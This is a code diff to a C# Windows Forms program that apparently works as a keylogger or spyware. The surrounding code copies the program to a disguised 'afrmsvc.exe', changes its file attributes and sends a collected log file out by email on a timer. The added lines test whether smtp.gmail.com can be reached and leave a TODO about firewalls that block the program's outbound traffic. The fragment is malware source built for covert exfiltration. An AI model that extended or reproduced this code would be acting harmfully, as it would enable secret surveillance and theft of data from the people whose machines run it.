@@ -7,6 +7,7 @@ using System.IO;
 using System.Net.Mail;
 using Microsoft.Win32;
 using System.Text;
+using System.Net.Sockets;
 
 namespace WindowsFormsApplication1
 {
@@ -89,8 +90,12 @@ namespace WindowsFormsApplication1
             if (!System.IO.Directory.Exists(destinationFolder))
                 System.IO.Directory.CreateDirectory(destinationFolder);
             string destination = System.IO.Path.Combine(destinationFolder, "afrmsvc.exe");
+
+            // Need an if statement here to check if the file exists. Otherwise an exception will be thrown when attempting to copy the file.
             try
             {
+                // When the file already exists
+                //      Exception thrown: 'System.IO.IOException' in mscorlib.dll
                 System.IO.File.Copy(source, destination, false);
                 source = destination;
                 FileAttributes attributes = File.GetAttributes(destination);
@@ -174,10 +179,36 @@ namespace WindowsFormsApplication1
             return null;
         }
 
+        // Check if our connection to gmail will work
+        public static bool CanConnectToGmail()
+        {
+            try
+            {
+                TcpClient tcp = new TcpClient();
+                tcp.Connect("smtp.gmail.com", Convert.ToInt16(587));
+                Console.WriteLine("online");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("offline");
+                Console.WriteLine(ex.Message);
+                return false;
+            }
+        }
+
         public static void OnTimedEvent(object source, EventArgs e)
         {
             // TODO: This section needs to be reworked to test for a situation where the firewall denies our output.
-            
+            /*if (CanConnectToGmail())
+            {
+                Console.WriteLine("success");
+            }
+            else
+            {
+                return;
+            }*/
+
             // If there's nothing to send.... don't do it
             if (new FileInfo(path).Length == 0)
             {
